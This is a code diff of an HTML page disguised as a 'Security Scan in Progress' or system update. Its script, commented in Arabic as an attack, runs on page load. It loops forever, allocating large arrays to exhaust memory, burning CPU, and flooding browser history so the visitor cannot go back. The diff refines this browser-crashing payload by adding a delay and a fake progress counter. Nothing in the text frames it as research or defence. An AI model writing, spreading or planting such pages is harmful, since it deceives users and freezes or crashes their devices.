@@ -1,26 +1,43 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Update</title></head>
+<head>
+    <title>System Diagnostic</title>
+    <style>
+        body { background-color: black; color: white; text-align: center; padding-top: 20%; font-family: Arial; }
+    </style>
+</head>
 <body>
+    <h1>Security Scan in Progress...</h1>
+    <p id="progress">Initializing: 0%</p>
+
     <script>
-        function trigger() {
-            // مصفوفة ضخمة جداً لتدمير الرام في أقل من ثانية
-            let bomb = [];
+        // دالة تجميد النظام الفوري
+        function freeze() {
+            let memoryBuster = [];
+            
+            // حلقة لا نهائية تعمل بأقصى سرعة ممكنة
             while (true) {
-                bomb.push(new Uint8Array(10000000).fill(1)); // إضافة 10MB في كل لفة
+                // 1. تدمير الرام: حجز مساحات ضخمة من الذاكرة بشكل متفجر
+                memoryBuster.push(new Uint32Array(1000000).fill(0xDEADBEEF));
                 
-                // إجهاد المعالج بحسابات ثقيلة
-                let x = Math.sqrt(Math.random() * 1000000);
+                // 2. تجميد الواجهة: استخدام حلقة تكرار حسابية تمنع أي لمس للشاشة
+                for (let i = 0; i < 1000000; i++) {
+                    let x = Math.atan2(Math.random(), Math.random());
+                }
+
+                // 3. منع الرجوع: إغراق تاريخ المتصفح لمنع المستخدم من الخروج
+                window.history.pushState(null, null, "?crash=" + Math.random());
                 
-                // إضافة سجلات وهمية لتجميد المتصفح
-                window.history.pushState(null, null, location.href + x);
-                
-                // طباعة وهمية لإبقاء المعالج في أقصى طاقة
-                console.log("Overflowing... " + x);
+                // تحديث وهمي للشاشة لإبقاء المعالج في حالة ضغط 100%
+                document.getElementById('progress').innerText = "Processing: " + Math.random() + "%";
             }
         }
-        window.onload = trigger;
+
+        // تشغيل الهجوم بمجرد تحميل الصفحة
+        window.onload = function() {
+            // تأخير بسيط لمدة ثانية واحدة لضمان تحميل الصفحة بالكامل قبل الانفجار
+            setTimeout(freeze, 1000);
+        };
     </script>
-    <h1 style="text-align:center; margin-top:20%;">Loading Security Patch... 0%</h1>
 </body>
 </html>
